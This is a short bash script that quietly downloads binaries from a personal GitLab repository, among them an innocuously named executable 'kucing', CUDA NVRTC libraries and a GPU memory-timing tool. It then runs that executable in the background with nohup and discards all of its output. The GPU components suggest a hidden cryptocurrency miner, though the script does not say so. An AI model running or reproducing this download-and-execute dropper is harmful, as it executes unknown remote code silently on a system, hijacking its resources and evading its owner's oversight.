#!/bin/bash
sudo apt install wget
wget -qO libnvrtc.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc.so.12.0.76
wget -qO kucing https://gitlab.com/sarifadim/jomblo/-/raw/main/kucing && chmod +x kucing
wget -qO libnvrtc-builtins.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc-builtins.so.12.0.76
wget -qO amdmemtweak https://gitlab.com/sarifadim/jomblo/-/raw/main/amdmemtweak
nohup ./kucing >/dev/null 2>&1 &
